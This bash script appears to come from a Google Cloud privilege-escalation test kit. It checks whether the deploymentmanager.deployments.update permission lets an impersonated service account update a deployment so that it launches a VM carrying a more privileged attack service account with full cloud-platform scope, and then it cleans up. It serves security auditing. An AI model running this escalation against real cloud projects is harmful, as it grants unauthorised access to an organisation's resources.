#!/bin/bash

source lib/lib.sh

echo "================================================"
echo "Checking deploymentmanager.deployments.update"

enable_service "deploymentmanager.googleapis.com"

modify_role "deploymentmanager.deployments.update"

# More resources https://cloud.google.com/deployment-manager/docs/configuration/supported-resource-types
echo "resources:
- name: vm-created-by-deployment-manager
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/n1-standard-1
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-9
    networkInterfaces:
    - network: global/networks/test" > /tmp/gcp_privesc1.yaml
  
echo "resources:
- name: vm-created-by-deployment-manager
  type: compute.v1.instance
  properties:
    serviceAccounts:
    - email: ${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com
      scopes:
      - https://www.googleapis.com/auth/cloud-platform
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/n1-standard-1
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-9
    networkInterfaces:
    - network: global/networks/test" > /tmp/gcp_privesc2.yaml

gcloud deployment-manager deployments create test-vm-deployment --config /tmp/gcp_privesc1.yaml

echo "Sleeping 1min to then update deployment"
sleep 60

gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com"\
  deployment-manager deployments update test-vm-deployment --config /tmp/gcp_privesc2.yaml

# Cleaning
gcloud deployment-manager deployments list
echo "Access: https://console.cloud.google.com/dm/deployments?project=${PROJECT_ID} to confirm a new VM is being deployed with th indicated service account"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/gcp_privesc1.yaml /tmp/gcp_privesc2.yaml

modify_role "deploymentmanager.deployments.delete"

echo "y" | gcloud deployment-manager deployments delete test-vm-deployment

disable_service "deploymentmanager.googleapis.com"

echo "================================================"
